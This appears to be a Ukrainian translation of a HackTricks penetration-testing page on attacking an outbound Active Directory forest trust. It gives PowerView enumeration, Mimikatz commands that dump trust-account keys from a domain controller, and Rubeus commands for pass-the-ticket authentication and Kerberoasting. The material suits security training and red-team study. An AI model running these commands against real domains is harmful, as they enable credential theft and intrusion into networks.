# Зовнішній Лісовий Домен - Односторонній (Вихідний)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

У цьому сценарії **ваш домен** надає деякі **привілеї** принципалу з **інших доменів**.

## Енумерація

### Вихідна Довіра
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Атака на обліковий запис довіри

Існує вразливість безпеки, коли встановлюється довірчий відносин між двома доменами, які тут ідентифікуються як домен **A** та домен **B**, де домен **B** розширює свій довіру до домену **A**. У цьому налаштуванні створюється спеціальний обліковий запис в домені **A** для домену **B**, який відіграє важливу роль у процесі аутентифікації між цими двома доменами. Цей обліковий запис, пов'язаний з доменом **B**, використовується для шифрування квитків для доступу до служб у межах доменів.

Критичним аспектом для розуміння тут є те, що пароль та хеш цього спеціального облікового запису можна витягти з контролера домену в домені **A**, використовуючи інструмент командного рядка. Команда для виконання цієї дії:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Це видобуток можливий, оскільки обліковий запис, ідентифікований з **$** після свого імені, активний і належить до групи "Користувачі домену" домену **A**, тим самим успадковуючи дозволи, пов'язані з цією групою. Це дозволяє особам аутентифікуватися проти домену **A**, використовуючи облікові дані цього облікового запису.

**Попередження:** Це можливо використовувати цю ситуацію для отримання опору в домені **A** як користувач, хоча з обмеженими дозволами. Однак цей доступ достатній для виконання переліку в домені **A**.

У сценарії, де `ext.local` є довіряючим доменом, а `root.local` - довіреним доменом, обліковий запис користувача з іменем `EXT$` буде створено в `root.local`. За допомогою конкретних інструментів можливо витягти ключі довіри Kerberos, розкриваючи облікові дані `EXT$` в `root.local`. Команда для досягнення цього:
```bash
lsadump::trust /patch
```
Після цього можна використовувати видобутий ключ RC4 для аутентифікації як `root.local\EXT$` в межах `root.local`, використовуючи іншу команду інструменту:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Цей крок аутентифікації відкриває можливість переліку та навіть експлуатації служб в межах `root.local`, таких як виконання атаки Kerberoast для вилучення облікових даних облікового запису служби за допомогою:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Збір пароля довіри у відкритому вигляді

У попередньому потоці використовувався хеш довіри замість **пароля у відкритому вигляді** (який також був **витягнутий за допомогою mimikatz**).

Пароль у відкритому вигляді можна отримати, конвертуючи вивід \[ CLEAR ] з mimikatz з шістнадцяткового формату та видаливши нульові байти '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Іноді при створенні довірчого відношення користувач повинен ввести пароль для довіри. У цій демонстрації ключ - це початковий пароль довіри, тому він читабельний для людини. Оскільки ключ циклічний (30 днів), пароль у відкритому вигляді не буде читабельним для людини, але технічно все ще може бути використаний.

Пароль у відкритому вигляді може бути використаний для виконання звичайної аутентифікації як довірчий обліковий запис, альтернатива запиту TGT за допомогою секретного ключа Kerberos довірчого облікового запису. Тут запит root.local з ext.local для членів Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Посилання

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
